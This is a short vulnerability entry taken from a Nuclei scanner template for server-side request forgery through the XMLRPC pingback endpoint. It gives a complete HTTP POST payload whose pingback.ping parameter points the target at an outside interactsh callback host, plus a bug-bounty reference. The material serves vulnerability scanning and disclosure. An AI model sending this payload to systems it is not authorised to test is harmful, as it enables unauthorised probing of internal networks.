# Nuclei Template: XMLRPC Pingback SSRF
**Template ID:** xmlrpc-pingback-ssrf
**Vulnerability Class:** Server-Side Request Forgery (SSRF)
**Severity:** High
**CWE:** CWE-918
**Source:** Nuclei Template (`xmlrpc-pingback-ssrf.yaml`)

## Vulnerability Information & PoC

## Description
XMLRPC Pingback leads to SSRF.

## Steps to reproduce / Exploit Payload
```http
POST /xmlrpc/pingback HTTP/1.1
Host: {{Hostname}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value>http://{{interactsh-url}}</value>
</param>
</params>
</methodCall>
```

## References
- https://hackerone.com/reports/406387
